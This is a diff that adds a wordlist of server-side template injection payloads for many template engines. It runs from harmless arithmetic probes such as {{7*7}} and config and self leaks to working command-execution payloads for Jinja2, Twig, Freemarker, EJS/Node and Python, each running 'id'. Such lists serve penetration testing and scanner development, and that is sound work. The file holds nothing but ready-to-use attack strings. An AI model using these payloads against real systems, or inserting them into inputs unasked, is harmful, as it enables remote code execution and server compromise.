@@ -1,0 +1,21 @@
+{{7*7}}
+{{7*'7'}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{7*7}
+${{7*7}}
+@(7*7)
+[[7*7]]
+{{=7*7}}
+*{7*7}
+{{config}}
+{{self}}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ lipsum.__globals__.os.popen('id').read() }}
+<%= process.getBuiltinModule('child_process').execSync('id').toString() %>
+<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
+{{['id']|filter('system')}}
+${__import__('os').popen('id').read()}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+#{global.process.mainModule.require('child_process').execSync('id')}
